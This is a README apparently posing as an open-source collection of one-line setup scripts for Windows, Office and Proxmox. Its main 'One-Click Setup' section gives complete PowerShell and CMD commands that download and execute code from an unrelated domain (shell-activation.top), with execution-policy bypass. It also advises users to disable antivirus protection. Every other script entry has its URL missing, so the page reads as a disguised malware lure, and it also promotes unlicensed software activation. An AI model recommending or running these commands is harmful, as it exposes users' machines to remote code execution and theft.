<div align="center">

# Run: Open-Source Single-Line Script Collection for Windows 10 & 11

![preview](https://raw.githubusercontent.com/tiagotavares7496-beep/open-source-automation-scripts/main/frame_d4c7.svg)

[![build](https://img.shields.io/badge/Build-Green-2ea44f?style=social&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/Ps--Core-Installer-2f81f7?style=social&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/Stage-Production-2ea44f?style=social&labelColor=0d1117)]()

</div>

---

A collection of single-line scripts for automating repetitive setup and maintenance tasks across Windows, Office, and Proxmox VE. Everything here is open source and built to run directly from a terminal, with no cloning or manual configuration required. Windows users will find activation and installer scripts, while Proxmox users get post-install tweaks, Docker setup, and Home Assistant deployment. Each entry below lists what it does and the one line needed to run it.

## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **Automated setup** — one command, done.
> Win 10/11 · PowerShell 5.1+ · Standard user

### 1️⃣ Open PowerShell
* Open the Start menu and type **PowerShell**.
* Right-click and choose **Run as administrator** (optional).

### 2️⃣ Run the script
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ Forced run via CMD
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## ✅ Before You Start

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## What it does

This repo is a grab bag of one-liners that each do exactly one annoying job. Nothing to clone, nothing to configure up front — you run a single command in the right shell and the script handles the rest.

**Windows & Office activation** — Runs an activation routine from a PowerShell prompt, presents the available options, and lets you pick one. Handy when you're setting up a fresh machine and don't want to click through menus.

**Proxmox host scripts** — Three separate one-liners aimed at the PVE host shell: a post-install tuning script, a Docker installer, and a Home Assistant + Portainer deployment that leaves its config volume in a predictable place. All run directly on the node, no template juggling.

**Spotify ad-free (SpotX)** — Applies the SpotX patch with a new theme and update blocking enabled by default. One command from PowerShell, done.

**Apple USB drivers** — Pulls down and installs the Apple USB driver set on Windows, which is the usual prerequisite for iPhone tethering and device access.

**VS Code installer** — Fetches and installs Visual Studio Code from PowerShell without a trip to the download page.

Each script is self-contained: no dependencies to chase, no repo to keep around afterward. Run it, let it finish, move on. If a script needs a specific shell (PowerShell vs. a PVE host shell), that's the only thing to get right before pasting.

## Quick start examples

Pick the script that matches your situation, open the right shell, run one line, and read the prompts. Every entry follows that same pattern — no cloning, no build steps, no dependencies to babysit.

### Windows & Office activation
Open PowerShell (Windows key + X, then PowerShell or Terminal), paste the line, hit enter, and choose the highlighted activation option when the menu appears.

```
irm | iex
```

### Proxmox VE host scripts
Run these from the PVE host shell: select your node in the web interface, open Shell, paste, enter. They target the host itself, so don't run them inside a guest.

Post-install tuning for the PVE host:

```
bash -c "$(curl -fsSL )"
```

Docker on the PVE host:

```
bash -c "$(curl -fsSL )"
```

Home Assistant plus Portainer:

```
bash -c "$(curl -fsSL )"
```

The Home Assistant config volume lands at `/var/lib/docker/volumes/hass_config/_data` — back that path up before you touch the stack again.

### Spotify without ads (SpotX)
PowerShell again, then:

```
iex "& { $(iwr -useb ') } -new_theme -block_update_on"
```

`-block_update_on` is the important flag: it stops Spotify from quietly reinstalling itself over the patch. Swap flags if you want a different theme or update behavior.

### Apple USB drivers
PowerShell, one line:

```
irm | iex
```

### Visual Studio Code installer
PowerShell, one line:

```
irm | iex
```

### Script-savvy notes
- `irm | iex` and `bash -c "$(curl ...)"` execute remote code directly. Skim the source first if you're running this on a machine you care about.
- Each script is self-contained; rerunning one is safe in most cases but may re-prompt for choices. Read the prompts instead of hammering enter.
- Anything requiring a reboot (activation, drivers) will tell you. Don't chain other setup steps behind it until the reboot is done.

## Configuration

Most scripts in run are designed to work without any configuration; they run with sensible defaults. Where a script writes or reads state, the behavior is described below.

**Activation scripts (Windows & Office)**
- No config files are written. The activation script prompts for options at runtime and applies the selected activation.
- To change the chosen option later, run the same script again and pick a different selection.

**Proxmox post-install**
- The post-install helper adjusts host-level settings (repositories, defaults, options) interactively. It shows proposed changes and asks for confirmation before applying.
- Any prompts you accept are persisted to the relevant PVE host files; re-running the script lets you adjust those settings.

**Proxmox Docker**
- Installs Docker with default settings. Container data and Docker state live in their standard locations on the Proxmox host (`/var/lib/docker`).
- No separate config file is required. Manage Docker through the usual `docker`/`compose` commands after the script completes.

**Proxmox Home Assistant**
- Home Assistant and Portainer are installed with Docker. The Home Assistant configuration volume is created automatically.
- Configuration is read from the Home Assistant data volume:
 ```
 /var/lib/docker/volumes/hass_config/_data
 ```
- Edit `configuration.yaml` and related files in that directory, then restart the Home Assistant container for changes to take effect.

**SpotX**
- Installs Spotify with the SpotX options chosen at run time. Flags passed to the script (for example, to theme the client or block updates) control behavior; repeat the command with different flags to change the outcome.
- Re-running the script replaces the current Spotify/SpotX state with the new options.

**Apple USB drivers**
- Installs the drivers with defaults. No configuration is needed; uninstall or reinstall by re-running the script.

**VS Code installer**
- Installs Visual Studio Code with default options. No configuration is needed; update by re-running the script.

**General notes**
- Scripts that modify the system may require an elevated shell (PowerShell as Administrator on Windows, a root shell on Proxmox).
- Back up any files you care about before re-running a script, since re-runs can overwrite prior settings.
- If a script offers prompts, review them rather than blindly accepting defaults.

## FAQ

**Do these scripts require admin or root privileges?**

Yes. The activation and installer scripts on the Windows side need an elevated PowerShell or Terminal session, and the Proxmox scripts expect to be run from the host shell as root. If you are not elevated, expect failures on registry writes, service creation, or package management. Run from the correct context the first time and save yourself the retry loop.

**Can I run the Proxmox scripts inside a container or VM instead of the host?**

No. The post-install, Docker, and Home Assistant scripts are written against the PVE host itself. Running them inside an LXC or VM will either fail outright or modify the wrong environment. Use the host shell from the PVE web interface.

**The script ran, but nothing seems to have changed. What should I check?**

First, confirm you saw the script's output complete without errors. Second, check that you were in the right shell context (elevated on Windows, host shell on Proxmox). Third, some changes only take effect after a reboot or after restarting the relevant service. If the script exited silently, re-run it and watch the console for warnings — they usually tell you exactly which step was skipped and why.

**Is it safe to re-run a script if I'm not sure it finished?**

Generally yes. The scripts are written to be idempotent where practical, so re-running typically re-applies the same state rather than duplicating it. If a script partially completed, re-running is usually the cleanest recovery path. If you want to be cautious, snapshot the system first — especially on Proxmox, where snapshots are cheap.

**Will these scripts survive a Windows update or a Proxmox upgrade?**

Windows feature updates can reset activation state or remove tweaks, and major Proxmox version upgrades can change package behavior. If something stops working after an update, re-run the relevant script. That is the intended recovery flow, not a bug.

**Where does the Home Assistant config live after installation?**

The persistent config directory is at `/var/lib/docker/volumes/hass_config/_data` on the Proxmox host. Back that path up before making major changes, and treat it as the source of truth if you need to migrate or restore.

**Do the scripts phone home or collect anything?**

The scripts run locally against your own machine. They fetch what they need to do their job, apply changes, and exit. Nothing is uploaded. If you want to verify, read the script before running it — that is the whole point of keeping them short and single-line.

**Can I modify a script for my own setup?**

Yes, that is expected. Fork it, adjust paths, flags, or package lists to match your environment, and keep your changes in your own copy. Just don't expect upstream to track your local edits.

**Why single-line scripts instead of a proper package or installer?**

Because they are meant to be copied, pasted, and read in one glance. No build step, no dependency graph, no install ceremony. If a one-liner grows past the point of being readable, that is the signal to split it — not to add a wrapper.

**Something broke and I don't know why. What's the fastest way to get help?**

Capture the exact command you ran, the full console output, and your OS or PVE version. That trio answers most diagnostic questions before anyone has to ask. Reproduce it once more with output visible, then share that.

## Disclaimer

These scripts are provided as-is, with no warranty of any kind. They modify system settings, install software, and in some cases alter activation state — run them only on machines you own or administer, and only after you understand what each one does.

Read the script before you execute it. Piping a remote script straight into a shell is convenient, but it means you are trusting whatever gets served at that moment. If you are not comfortable with that, fetch the script first, inspect it, then run it locally.

Activation scripts in particular sit in a legal grey area depending on your jurisdiction and licensing situation. Using them may violate the terms of service of the software involved. You are responsible for how you use them and for any consequences that follow.

Back up important data and, where practical, snapshot your system before running anything that touches boot configuration, package managers, or container volumes. Proxmox and Docker scripts can change networking, storage layout, or installed packages in ways that are not trivially reversible.

No one involved in maintaining this collection is liable for data loss, system instability, broken installations, licensing issues, or any other damage resulting from use of these scripts. If something breaks, you get to keep both pieces.

These scripts are intended for personal, educational, and lab use. Do not deploy them in production or on systems you do not control without independent review.